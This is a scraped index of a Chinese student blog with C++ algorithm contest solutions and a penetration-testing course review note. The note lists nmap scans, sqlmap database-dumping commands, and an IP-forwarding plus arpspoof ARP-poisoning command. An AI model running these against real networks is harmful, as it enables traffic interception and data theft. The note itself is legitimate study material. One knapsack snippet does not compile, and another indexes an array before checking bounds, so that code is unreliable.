pt":"","text":"¶换零钞 x 星球的钞票的面额只有：100元，5元，2元，1元，共4种。小明去x星旅游，他手里只有2张100元的x星币，太不方便，恰好路过x星银行就去换零钱。小明有点强迫症，他坚持要求200元换出的零钞中2元的张数刚好是1元的张数的10倍，剩下的当然都是5元面额的。银行的工作人员有点为难，你能帮助算出：在满足小明要求的前提下，最少要换给他多少张钞票吗？（5元，2元，1元面额的必须都有，不能是0） 注意，需要提交的是一个整数，不要填写任何多余的内容。 用数学方法解决： 要求钞票张数最少，满足5元钞票最多即可。 设 1 元钞票有 x 张，则 2 元钞票有 10x 张，5 元钞票 y 张。 有：x+2*10x+5y=200 整理得：y=40-21*x/5 要想 y 最大，x必须最小，所以 x=5； 所以 1 元钞票有 5 张，则 2 元钞票有 50 张，5 元钞票 19 张。 Ans： 74 ¶激光样式 x星球的盛大节日为增加气氛，用30台机光器一字排开，向太空中打出光柱。 安装调试的时候才发现，不知什么原因，相邻的两台激光器不能同时打开！ 国王很想知道，在目前这种bug存在的情况下，一共能打出多少种激光效果？ 显然，如果只有3台机器，一共可以成5种样式，即： 全都关上（sorry, 此时无声胜有声，这也算一种） 开一台，共3种 开两台，只1种。30台就不好算了，国王只好请你帮忙了。要求提交一个整数，表示30台激光器能形成的样式种数。 提示： 斐波那契数列 12345678910111213#include &lt;iostream&gt;using namespace std;int main()&#123; int f[30]; f[0] = 2; f[1] = 3; for(int i=2;i&lt;30;i++)&#123; f[i] = f[i-1] + f[i-2]; &#125; cout &lt;&lt; f[29] &lt;&lt; endl; return 0;&#125; Ans：2178309 ¶调手表 提示： 广度搜索","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"「算法」闫氏DP分析法","slug":"【算法】闫氏DP分析法","date":"2021-05-30T06:01:02.000Z","updated":"2021-08-17T09:02:57.000Z","comments":true,"path":"2021/05/30/【算法】闫氏DP分析法/","link":"","permalink":"http://blog.keter.top/2021/05/30/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E9%97%AB%E6%B0%8FDP%E5%88%86%E6%9E%90%E6%B3%95/","excerpt":"","text":"¶闫氏DP分析法 核心：从集合角度来分析DP问题； 目的：求有限集中的最值 ¶动态规划 ¶状态表示 f(i) 化0为整，把一类集合变成一个整体然后用一个数来表示它； 集合 属性：f(i)与集合的关系 （max/min/bool） ¶状态计算 化整为0的过程：将f(i) 划分为几个子集进行计算，分别求每个子集，最后将子集合并起来； 划分的依据：寻找最后一个不同点 ¶几个例题 ¶01背包问题 选择问题 状态表示: f(i,j) 集合：所有只考虑前i个物品，并且总体积不超过j的选法的集合； 属性：max 集合当中每一个方案的最大价值 就是只考虑前n个值，不超过v的最大的值 状态计算: 对于f(v,i), 可以分为两类，一类是不选择第i个物品的方案，一类是选择第i个物品的方案； 那么我们可以得到不选择i的物品的方案就是f(v,i-1), 选择第i个物品的最大值是 那么最后的结果就是： AC代码为： 1234567891011121314151617181920#include&lt;iostream&gt;using namespace std;const int N = 2010;int n,m;int v[N],w[N];int f[N][N];int main()&#123; cin &gt;&gt; n &gt;&gt; m; for (int i=1;i&lt;=n; i++) cin &gt;&gt; v[i] &gt;&gt; w[i]; for(int i = 1; i &lt;= n; i++)&#123; for(int j = 0; j &lt;= m; j++)&#123; f[i][j] = f[i-1][j]; if(j &gt;= v[i]) f[i][j] = max(f[i][j],f[i-1][j-v[i]] + w[i]); &#125; &#125; cout &lt;&lt; f[n][m];&#125; ¶完全背包问题 状态表示: f(i,j) 集合：所有只考虑前i个物品，并且总体积不超过j的选法的集合； 属性：max 集合当中每一个方案的最大价值 就是只考虑前n个值，不超过v的最大的值 状态计算: 对于f(i,j), 完全背包问题需要划分为多个集合； 123456789101112131415161718192021222324/*01背包问题：f(i,j) = max(f[i-1][j], f[i-1]f[j-v] + w)完全背包问题：f(i,j) = max(f[i-1][j], f[i]f[j-v] + w)*/#include &lt;iostream&gt;using namespace std;const int N= 2010;int n,m;int v[N],w[N];int f[N][N];int main()&#123; cin &gt;&gt; n &gt;&gt;m; for (int i=1;i&lt;=n;i++) cin &gt;&gt; v[i] &gt;&gt; w[i]; for (int i=1;i&lt;=n;i ++)&#123; for(int j=0;j&lt;=m;j++)&#123; f[i][j] = f[i-1][j]; if (j &gt;= v[i]) f[i][j] = max(f[i][j], f[i][j-v[i]]+w[i]); &#125; &#125; cout &lt;&lt; f[n][m] &lt;&lt; endl;&#125; 当然你还可以进行优化： 1234567891011121314151617#include &lt;iostream&gt;using namespace std;const int N = 1010;int n,m;int v[N],w[N];int f[N]int main()&#123; cin &gt;&gt; n &gt;&gt; m; for(int i=1; i&lt;=m; i++) cin &gt;&gt; v[i] &gt;&gt; w[i]; for(int i=1; i&lt;=n; i++)&#123; for(int j=v[i];j&lt;=m,j++)&#123; f[j] = max(f[j],f[j-v[i]] + w); &#125; &#125; return 0;&#125; ¶石子问题 题目： https://www.acwing.com/problem/content/description/284/ 状态表示: f(i,j) 集合：所有将i到j的区间合并成一堆的方案的集合； 属性：min 集合当中每一个方案的最小代价； 状态计算: 对于f(i,j) 需要分为多个集合； 最后我们需要计算的结果就是 f(1,j) 12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;const int N = 310;int s[N];int f[N][N];int n;int main()&#123; cin &gt;&gt; n; for (int i=1;i&lt;=n;i++) cin &gt;&gt; s[i],s[i]+=s[i-1]; for(int len =2 ; len &lt;= n; len ++)&#123; for (int i=1 ; i+ len-1 &lt;= n;i ++)&#123; int j= i+len-1; f[i][j] = 1e8; for (int k=i;k&lt;j;k++)&#123; f[i][j] = min(f[i][j],f[i][k] + f[k + 1][j] + s[j] - s[i-1]); &#125; &#125; &#125; cout &lt;&lt; f[1][n] &lt;&lt; endl;&#125; ¶最长公共子序列 题目：https://www.acwing.com/problem/content/899/ 状态表示: f(i,j) 集合：所有A[1-i]与B[1-j]的公共子序列的集合 属性：max 状态计算: 对于f(i,j) 需要分为4种情况；在求最大值/最小值的时候情况可以重复但是不可以遗漏； 12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;const int N = 1010;int n,m;char a[N],b[N];int f[N][N];int main()&#123; cin &gt;&gt; n &gt;&gt; m &gt;&gt; a + 1 &gt;&gt; b + 1; for(int i = 1;i &lt;= n;i++)&#123; for(int j =1; j&lt;=m;j ++ )&#123; f[i][j] = max(f[i-1][j],f[i][j-1]); if(a[i] == b[j]) f[i][j] = max(f[i][j],f[i-1][j-1]+1); &#125; &#125; cout &lt;&lt; f[n][m] &lt;&lt; endl; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"「白帽子学习笔记」加油NPT","slug":"【白帽子学习笔记】加油NPT","date":"2021-05-26T06:01:02.000Z","updated":"2021-08-17T09:04:17.000Z","comments":true,"path":"2021/05/26/【白帽子学习笔记】加油NPT/","link":"","permalink":"http://blog.keter.top/2021/05/26/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%8A%A0%E6%B2%B9NPT/","excerpt":"¶【白帽子学习笔记】加油NPT 考试复习内容，看到这篇博客的小伙伴要加油啊！冲冲冲！ ¶0x01 PETS标准 整个渗透测试过程大致可以分为7个阶段： 前期与客户的交流阶段：确认是对目标的哪些设备和哪些问题进行测试，商讨过程中的主要因素有如下几个： 渗透测试的目标 进行渗透测试所需要的条件 渗透测试过程中的限制条件 渗透测试过程的工期 渗透测试费用 渗透测试过程的预期目标 情报的收集阶段：使用各种资源尽可能地获得要测试目标的相关信息 被动扫描 主动扫描 威胁建模阶段：这个阶段主要解释了如下的问题 哪些资产所目标中的重要资产 攻击时采用的技术和手段 哪些群里可能会对目标系统造成攻击 这些群体会使用哪些方法进行破坏 漏洞分析阶段 漏洞利用阶段 后渗透攻击阶段：尽可能地将目标被渗透后所可能产生的后果模拟出来，来给客户展示当前网络存在的问题会带来的风险 控制权限的提升 登录凭证的窃取 重要信息的获取 利用目标作为跳板 建立长期的控制通道 报告阶段","text":"¶【白帽子学习笔记】加油NPT 考试复习内容，看到这篇博客的小伙伴要加油啊！冲冲冲！ ¶0x01 PETS标准 整个渗透测试过程大致可以分为7个阶段： 前期与客户的交流阶段：确认是对目标的哪些设备和哪些问题进行测试，商讨过程中的主要因素有如下几个： 渗透测试的目标 进行渗透测试所需要的条件 渗透测试过程中的限制条件 渗透测试过程的工期 渗透测试费用 渗透测试过程的预期目标 情报的收集阶段：使用各种资源尽可能地获得要测试目标的相关信息 被动扫描 主动扫描 威胁建模阶段：这个阶段主要解释了如下的问题 哪些资产所目标中的重要资产 攻击时采用的技术和手段 哪些群里可能会对目标系统造成攻击 这些群体会使用哪些方法进行破坏 漏洞分析阶段 漏洞利用阶段 后渗透攻击阶段：尽可能地将目标被渗透后所可能产生的后果模拟出来，来给客户展示当前网络存在的问题会带来的风险 控制权限的提升 登录凭证的窃取 重要信息的获取 利用目标作为跳板 建立长期的控制通道 报告阶段 ¶0x02 ethical hacking的意义 ¶0x03 Kali基础 ¶1x01 NAT和桥接的区别 桥接模式：在桥接模式下，VMWare虚拟出来的操作系统就像是局域网中的一台独立的主机（主机和虚拟机处于对等地位），它可以访问网内任何一台机器。在桥接模式下，我们往往需要为虚拟主机配置ＩＰ地址、子网掩码等（注意虚拟主机的iｐ地址要和主机ｉｐ地址在同一网段）。使用桥接模式的虚拟系统和主机的关系，就如同连接在一个集线器上的两台电脑；要让他们通讯就需要为虚拟系统配置ip地址和子网掩码。如果我们需要在局域网内建立一个虚拟服务器，并为局域网用户提供服务，那就要选择桥接模式。 NAT：是Network Address Translation的缩写，意即网络地址转换。使用NAT模式虚拟系统可把物理主机作为路由器访问互联网，NAT模式也是VMware创建虚拟机的默认网络连接模式。使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信**。虚拟机向外部网络发送的请求数据’包裹’，都会交由NAT网络适配器加上’特殊标记’并以主机的名义转发出去**，外部网络返回的响应数据’包裹’，也是先由主机接收，然后交由NAT网络适配器根据’特殊标记’进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。**从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。**此外，在一台主机上只允许有一个NAT模式的虚拟网络。因此，同一台主机上的多个采用NAT模式网络连接的虚拟机也是可以相互访问的。 ¶1x02 基本操作 ifconfig：查看IP信息 netstat -r：查看网关 如何判断两台主机时候在同一网段？ 将两台主机的IP分别与子网掩码进行与运算，比较运算结果是否相同； ¶0x04 被动扫描 ¶1x01 什么是被动扫描？ 主要指的是在目标无法察觉的情况下进行的信息收集 目标网站的所有者信息，例如：姓名、地址、电话、电子邮件等 目标网站的电子邮箱 目标网站的社交信息：QQ、微博、微信、论坛发帖等 ¶1x02 zoomeye ZoomEye是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。 ¶1x03 Google Hacking site ： 指定域名 inurl：url存在关键字的网页 intext：网页正文中的关键字 filetype：指定文件类型 intitle：网页标题中的关键字 ¶0x05 主动扫描 主动扫描的范围要小得多。主动扫描一般都是针对目标发送特制的数据包，然后根据目标的反应来获得一些信息。这些信息主要包括目标主机是否在线、目标主机的指定端口是否开放、目标主机的操作系统、目标主机上运行的服务等。 ¶NMAP的应用 扫描操作系统: nmap -O IP 判断所在网络存活主机： 扫描192.168.0.0/24网段上有哪些主机的存活的 nmap -sP 192.168.0.0/24 扫描主机开放了哪些端口： TCP端口扫描：scan tcp nmap -sT IP UDP端口扫描：scan udp nmap -sU IP 扫描全部端口： nmap-p &quot;*&quot; ip 扫描前n的端口： nmap-top-ports n IP 扫描指定的端口： nmap -P IP 扫描目标开启了哪些服务： nmap -sV IP 将扫描结果保存为xml文件： nmap -oX a.xml IP ¶0x06 身份认证攻击 ¶1x01 BurpSuite 主要需要知道一个作用就是Proxy： 拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。 其他常用的功能还有： Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。 Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。 Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。 Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。 ¶如何设置安全的密码？ 避开若口令 能记住的密码才是好密码 密码中包含数字，大小写英文 增加密码的长度 每个应用的密码都设置的具有一定差异 ¶0x07 网络数据嗅探与欺骗 ¶1x01 如何利于Wireshark恢复数据流中的文件 利用WireShark的包筛选去筛选出需要的包 ==&gt; 跟踪数据流 ==&gt; 找到需要的数据，选择原数据进行保存 常用的WireShark语句： tcp：tcp流； http：http数据流； http.request.method：筛选HTTP数据流的请求方式； ip.src：对于数据源地址进行筛选 ip.dst：对于目的地址筛选 ¶1x02 arpspoof 开启端口转发，允许本机像路由器那样转发数据包 echo 1 &gt; /proc/sys/net/ipv4/ip_forward ARP投毒 arpspoof -i eth0 -t IP1 IP2(IP1是我们的攻击目标、IP2是网关IP地址) -i eth0表示选择eth0这个网卡； ARP攻击原理： 在局域网内的攻击方式主要有两种： . (1) PC1：PC2不断的向PC1发送欺骗包，欺骗其为网关路由，最后导致PC1的ARP表遭到攻击； (2) Route：PC2不断的向Route(网关路由)发送欺骗包，欺骗其为PC1； 因为arp欺骗想把原理写明白需要很大的篇幅，这里就不细说了 ¶0x08 远程控制 ¶1x01 正向连接和反向连接的区别 反向连接：攻击机设置一个端口（LPORT）和IP（LHOST），Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经连接。 正向连接：攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入。 ¶1x02 反向连接的实施过程 攻击者先通过某个手段在目标机器上植入恶意代码，并且该代码可以被触法。攻击者设置一个端口和一个IP，当被攻击者执行了恶意代码后攻击者的机器就会获取被攻击者的代码。 ¶0x09 漏洞扫描 ¶1x01 工具们 工具： AWVS：漏洞扫描工具 Beef：XSS漏洞利用工具 SQLMAP：自动话sql注入工具： 查询当前数据库：sqlmap -u &quot;IP&quot; --cookie &quot;xxx&quot; --current-db 查询当前使用者：--current user 爆破数据表：-D xx --tables 爆破数据表表头：-D xx -T xx --columns 爆破具体的列：-D xx -T xx -C xx Whatweb: 查询网页的基本信息 whatweb IP Wpscan:可以扫描WordPress中的多种安全漏洞 Dirb：爆破用 dirb -u http://IP MeterSploit:功能非常强大的渗透工具 ¶1x02 XSS攻击/SQL注入 **XSS攻击：**XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 SQL注入攻击的原理：恶意用户在提交查询请求的过程中将SQL语句插入到请求内容中，同时程序本身对用户输入内容过分信任而未对恶意用户插入的SQL语句进行过滤，导致SQL语句直接被服务端执行。 ¶0x10 OWASP TOP 10 Injection. Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. Broken Authentication. Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently. Sensitive Data Exposure. Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser. XML External Entities (XXE). Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks. Broken Access Control. Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc. Security Misconfiguration. Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion. Cross-Site Scripting XSS. XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites. Insecure Deserialization. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks. Using Components with Known Vulnerabilities. Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts. Insufficient Logging &amp; Monitoring. Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"网络渗透测试","slug":"课程学习/网络渗透测试","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"网络渗透测试","slug":"网络渗透测试","permalink":"http://blog.keter.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"「算法」第十一届蓝桥杯国赛题解","slug":"【算法】第十一届蓝桥杯国赛题解","date":"2021-05-17T06:01:02.000Z","updated":"2021-08-17T09:03:21.000Z","comments":true,"path":"2021/05/17/【算法】第十一届蓝桥杯国赛题解/","link":"","permalink":"http://blog.keter.top/2021/05/17/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E7%AC%AC%E5%8D%81%E4%B8%80%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%9B%BD%E8%B5%9B%E9%A2%98%E8%A7%A3/","excerpt":"","text":"PDF 下载链接： 点我下载 ¶美丽的二 提示： stl的运用，用string的find函数找一下就可以了 1234567891011121314151617#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() &#123; int ans = 0; string year; for (int i = 1; i &lt; 2021; ++i) &#123; year = to_string(i); if (year.find(&#x27;2&#x27;) != year.npos) &#123; ans += 1; &#125; &#125; cout &lt;&lt; ans; return 0;&#125; Ans: 563 ¶扩散 提示： 其实还是stl的应用，会用标准库的话真的挺简单的。主要的思想就是用一个集合来存已经扩散后的格子，一个队列用来存储正在扩散的格子； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;#include &lt;set&gt;#include &lt;queue&gt;using namespace std;int loc[4][2] = &#123;-1, 0, 1, 0, 0, -1, 0, 1&#125;;struct ppair &#123; int xx; // x坐标 int yy; // y坐标 int ss; // 步数 ppair() &#123; xx = 0; yy = 0; ss = 0; &#125; ppair(int x, int y, int s) &#123; xx = x; yy = y; ss = s; &#125;&#125;;int main() &#123; int ans = 4; set&lt;pair&lt;int, int&gt;&gt; points; // 存储已经扩散的点 queue&lt;ppair&gt; que; // 将初始点加入队列当中 que.push(ppair(0, 0, 0)); que.push(ppair(2020, 11, 0)); que.push(ppair(11, 14, 0)); que.push(ppair(2000, 2000, 0)); int i, j; int x, y; while (!que.empty()) &#123; ppair point = que.front(); x = point.xx; y = point.yy; if (!points.count(make_pair(x, y)) and point.ss &lt;= 2020) &#123; points.insert(make_pair(x, y)); for (i = 0; i &lt; 4; i++) &#123; que.push(ppair(x + loc[i][0], y + loc[i][1], point.ss + 1)); &#125; &#125; que.pop(); &#125; ans += points.size(); cout &lt;&lt; ans;&#125; Ans: 20312092 ¶阶乘约数 提示： 数论的题目，结论是每一个数都可以被分解为素数的乘积，将素数的乘积的幂次方加一后乘起来； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;vector&gt;using namespace std;bool judge(int n) &#123; bool re = true; if (n &lt;= 2) return re; for (int i = 2; i &lt; n; ++i) &#123; if (n % i == 0) &#123; re = false; break; &#125; &#125; return re;&#125;int main() &#123; vector&lt;int&gt; p; // 计算100以内的所有素数 for (int i = 2; i &lt;= 100; ++i) &#123; if (judge(i)) &#123; p.push_back(i); &#125; &#125; map&lt;int, int&gt; count; for (int i : p) &#123; count[i] = 1; // 在初始化的时候就+1 &#125; for (int i = 2; i &lt;= 100; ++i) &#123; int num = i; int j = 0; while (num != 1) &#123; if (num % p[j] == 0) &#123; num = num / p[j]; count[p[j]]++; &#125; else &#123; j++; &#125; &#125; &#125; long long res = 1; for (int i:p) &#123; res *= count[i]; &#125; cout &lt;&lt; res; return 0;&#125; Ans: 39001250856960000 ¶本质上升序列 提示： 动态规划：建立dp数组, dp[i]表示以num[i]为结尾的子序列个数，为什么可以这么想呢？因为我们已经确定了序列的最后一位是 num[i] A: 假如num[j](j&lt;i)是小于num[i]的, 那么dp[i]=dp[i]+dp[j]就是我们要求的答案。 B: 假如num[j](j&lt;i)是等于num[i]的 dp[i]=dp[i]-dp[j], 这是因为该种情况已经被加进去了。为了去重所以是dp[i] - dp[j] 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;string&gt;using namespace std;int main() &#123; string S = &quot;tocyjkdzcieoiodfpbgcncsrjbhmugdnojjddhllnofawllbhfiadgdcdjstemphmnjihecoapdjjrprrqnhgccevdarufmliqijgihhfgdcmxvicfauachlifhafpdccfseflcdgjncadfclvfmadvrnaaahahndsikzssoywakgnfjjaihtniptwoulxbaeqkqhfwl&quot;; int dp[201]; for (int i = 0; i &lt; 201; ++i) &#123; dp[i] = 1; &#125; for (int i = 0; i &lt; S.size(); ++i) &#123; for (int j = 0; j &lt; i; ++j) &#123; if (S[i] &gt; S[j])&#123; dp[i] += dp[j]; &#125; if (S[i] == S[j])&#123; dp[i] -= dp[j]; &#125; &#125; &#125; int res = 0; for (int i = 0; i &lt; S.size(); ++i) &#123; res += dp[i]; &#125; cout &lt;&lt; res &lt;&lt; endl; return 0;&#125; Ans: 3616159 ¶玩具蛇 提示： 使用dfs进行搜索，如果走了16步了说明是满足题述的一种情况。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &quot;iostream&quot;using namespace std;// 方向控制int dx[4] = &#123;1, 0, -1, 0&#125;;int dy[4] = &#123;0, 1, 0, -1&#125;;int a[4][4] = &#123;0&#125;;int n = 0;// x,y相当于正在放置的格子的坐标void dfs(int stay, int x, int y) &#123; int tx, ty; // 递归终止条件 if (stay == 16) &#123; n++; return; &#125; // 尝试向四个方向放置 for (int i = 0; i &lt; 4; i++) &#123; tx = x + dx[i]; ty = y + dy[i]; // 该格子不可放置 或越界 跳过该方向 if (a[tx][ty] == 1 || tx &lt; 0 || tx &gt; 3 || ty &lt; 0 || ty &gt; 3) continue; // 对已放置的格子进行标记 a[tx][ty] = 1; dfs(stay + 1, tx, ty); // 清除标记 a[tx][ty] = 0; &#125;&#125;int main() &#123; int i, k; // 对4x4的格子 枚举玩具蛇第一个步放置的所有可能。 for (i = 0; i &lt; 4; i++) &#123; for (k = 0; k &lt; 4; k++) &#123; // 对已放置的格子进行标记 a[i][k] = 1; dfs(1, i, k); // 清除标记 a[i][k] = 0; &#125; &#125; cout &lt;&lt; n; return 0;&#125; Ans：552","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"「算法」-《算法竞赛进阶指南》-基本算法篇","slug":"【算法】-《算法竞赛进阶指南》-基本算法篇","date":"2021-05-12T06:01:02.000Z","updated":"2021-08-13T13:47:47.000Z","comments":true,"path":"2021/05/12/【算法】-《算法竞赛进阶指南》-基本算法篇/","link":"","permalink":"http://blog.keter.top/2021/05/12/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91-%E3%80%8A%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97%E3%80%8B-%E5%9F%BA%E6%9C%AC%E7%AE%97%E6%B3%95%E7%AF%87/","excerpt":"","text":"¶位运算 ¶a^b 非常经典的快速幂算法，总之就是非常6啊，话不多数直接上代码吧； C++ 技巧： 使用 &gt;&gt;= 来完成二进制数字的移位 12345678910111213141516#include &lt;iostream&gt;using namespace std;int main()&#123; long long a,b,p; cin &gt;&gt; a &gt;&gt; b &gt;&gt; p; int res = 1 % p; while(b)&#123; if(b&amp;1) res = a * res % p; a = a * a % p; b &gt;&gt;= 1; &#125; cout &lt;&lt; res; return 0;&#125; ¶64位整数乘法 a * b mod p 其实就是n个a相乘后模p，将b看做一个二进制数，从左往右分别是1，2，4，8… 具体看代码了，总之就是非常的妙啊！ 123456789101112131415#include&lt;iostream&gt;using namespace std;typedef unsigned long long ULL;int main()&#123; ULL a,b,p; cin &gt;&gt; a &gt;&gt; b &gt;&gt; p; ULL res=0; while(b)&#123; if(b&amp;1) res = (res + a)%p; b &gt;&gt;= 1; // b的二进制往右边移动一位（妙！） a = a* 2% p; // 对应2进制的1，2，4，8，因为是对b进行2进制位运算的； &#125; cout &lt;&lt; res;&#125; ¶递归实现指数型枚举 提示： 使用位运算进行状态压缩； 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int a;void dfs(int u, int state) &#123; if (u == a) &#123; for (int i = 0; i &lt; a; i++) if (state &gt;&gt; i &amp; 1) cout &lt;&lt; i + 1 &lt;&lt; &#x27; &#x27;; cout &lt;&lt; endl; return; &#125; dfs(u + 1, state); dfs(u + 1, state | 1 &lt;&lt; u);&#125;int main() &#123; cin &gt;&gt; a; dfs(0, 0); return 0;&#125; ¶递归实现组合型枚举 提示： 使用二进制进行状态压缩； 123456789101112131415161718192021222324#include &lt;iostream&gt;using namespace std;int n, m;void dfs(int u, int sum, int state) &#123; if (sum + n - u &lt; m) return; if (sum == m) &#123; for (int i = 0; i &lt; n; i++) if (state &gt;&gt; i &amp; 1) cout &lt;&lt; i + 1 &lt;&lt; &#x27; &#x27;; cout &lt;&lt; endl; return; &#125; dfs(u + 1, sum + 1, state | 1 &lt;&lt; u); dfs(u + 1, sum , state);&#125;int main() &#123; cin &gt;&gt; n &gt;&gt; m; dfs(0, 0, 0); return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"「课程学习」计算机网络知识点笔记","slug":"【课程学习】计算机网络知识点笔记","date":"2021-05-11T06:01:02.000Z","updated":"2021-08-13T14:41:46.000Z","comments":true,"path":"2021/05/11/【课程学习】计算机网络知识点笔记/","link":"","permalink":"http://blog.keter.top/2021/05/11/%E3%80%90%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0%E3%80%91%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%94%E8%AE%B0/","excerpt":"","text":"卢畅的计算机网络课程笔记：持续更新中… ¶导论 ¶课程要求 掌握五层网络的模型结构和原理 掌握应用层中相关协议的基本组成和原理 掌握Ethernet的原理和协议 掌握主要的路由算法及路由协议 掌握主要的传输层协议 ¶IEEE 标准 几个常用的： Bus，IEEE 802.3【以太网】 Ring，IEEE 802.5【环网】 Token RING，IEEE 802.4 【令牌环网】 Wireless LANS，IEEE 802.11 【无线局域网】 ¶数据、信号、信息之间的关系 数据：就是0和1，看作货物。数据就是信息的载体 信号：车：传输的是数据【数据的载体】 信息：是数据的组合，比如C语言就会有ascii这种东西来给数据赋予具体的意义。 ¶物理层 ¶功能 通过规定物理设备和物理媒体之间的借口技术，实现物理设备之间的比特流传输。 服务是透明的，实现的细节不是透明的 =&gt; 层与层之间是相互独立又是联系的； ¶专有名词 带宽： 信号占据的频道范围； 信号传输速率：单位时间里传输信息波形的个数，单位为波特；【车辆通行的数量】 最大采样频率：B = 2H (bund) 数据传输率：单位时间内传输比特的个数，比特率，单位b/s，Kb/s 【这里的K是1000，只有说存储的时候才是1024】 波特与比特的关系： 波特是码元传输的速率单位，比特是信息量的单位 若一个码元上携带一个bit的信息这波特和比特在数值上相等 ¶指标 时延：总时延=发送时间+传播时延+转发时延 